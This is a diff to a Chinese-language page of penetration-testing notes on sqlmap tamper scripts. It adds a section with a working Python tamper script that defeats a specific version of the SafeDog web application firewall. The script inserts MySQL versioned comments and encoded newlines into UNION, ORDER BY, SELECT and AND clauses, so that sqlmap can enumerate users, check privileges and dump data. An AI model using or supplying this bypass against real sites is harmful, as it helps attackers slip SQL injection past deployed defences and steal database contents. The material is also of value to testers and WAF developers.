@@ -1,5 +1,7 @@
 # tamper
 
+### 一、自带tamper介绍
+
 1、tamper的作用：  
 使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。
 
@@ -312,4 +314,54 @@ sqlmap中所有的tamper：
     </tr>
   </tbody>
 </table>
+
+### 二、绕狗4.0tamper
+
+可过的版本：
+
+主程序版本号：V4.0.26550  
+网马库版本：2019-02-14  
+官方防护规则版本：2019-2-14
+
+tamper编写注意事项：
+
+因为 sqlmap 的测试时对 UNION 查询注入测试时必须确定当前表的列数，也就是利用 ORDER BY 来确定。如果ORDER BY 语句不成功则直接跳过 UNION 查询注入阶段。所以如果使用 UNION 查询注入 tamper 必须对 ORDER BY 进行绕过。 
+
+未绕过 ORDER BY 直接跳过 UNION 查询：
+
+![](../../.gitbook/assets/image%20%2835%29.png)
+
+```text
+可 dump 数据的 tamper
+#!/usr/bin/env python
+# SafeDog 4.0.26550
+#
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+
+def tamper(payload, **kwargs):
+    sign = '/*!51234a*/'
+    retVal = payload
+    l = ['UNION', 'ORDER','SELECT','super_priv'] # SELECT super_priv 为了sqlmap执行 "--is-dba"
+    data = {}
+    for i in l:
+        data[i] = i + sign
+    for i in data.keys():
+        retVal = retVal.replace(i, data[i])
+
+    retVal = retVal.replace("CURRENT_USER()", "CURRENT_USER" + sign + "()") # 为了sqlmap执行 "--current-user"
+    retVal = retVal.replace("AND ","AND%23%0a ") # 为了sqlmap执行 "--dump"
+    return retVal
+
+```
+
+测试效果：
+
+![](../../.gitbook/assets/image%20%2830%29.png)
 
